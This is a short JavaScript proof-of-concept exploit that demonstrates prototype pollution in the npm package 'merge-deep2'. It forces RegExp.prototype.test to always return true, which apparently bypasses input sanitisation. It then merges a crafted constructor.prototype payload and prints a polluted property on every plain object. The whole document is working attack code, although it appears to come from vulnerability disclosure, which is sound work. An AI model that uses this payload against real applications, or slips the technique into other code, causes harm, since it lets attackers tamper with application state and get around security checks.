RegExp.prototype.test = () => true;
const mergeDeep2 = require('merge-deep2');
let obj = {};
let malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
mergeDeep2({}, JSON.parse(malicious_payload), true);
console.log({}.polluted);